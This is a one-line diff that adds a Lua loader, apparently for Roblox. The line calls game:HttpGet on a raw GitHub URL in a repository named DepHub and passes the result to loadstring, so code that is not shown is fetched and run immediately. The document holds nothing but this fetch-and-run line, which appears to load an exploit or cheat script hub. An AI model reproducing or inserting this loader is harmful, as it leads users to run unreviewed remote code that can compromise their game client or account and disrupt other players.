@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DepHubHolder/DepHub1/main/Loader1"))()
